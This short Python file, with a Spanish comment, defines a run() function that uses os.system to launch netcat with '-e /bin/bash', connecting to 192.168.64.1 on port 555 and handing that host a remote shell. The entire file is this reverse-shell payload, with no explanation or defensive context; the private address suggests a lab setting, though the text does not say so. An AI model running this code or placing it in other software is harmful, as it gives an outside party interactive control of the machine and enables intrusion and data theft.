import os

def run():
    # Abre una conexión utilizando netcat y ejecuta un shell remoto
    os.system('nc -n 192.168.64.1 555 -e /bin/bash')
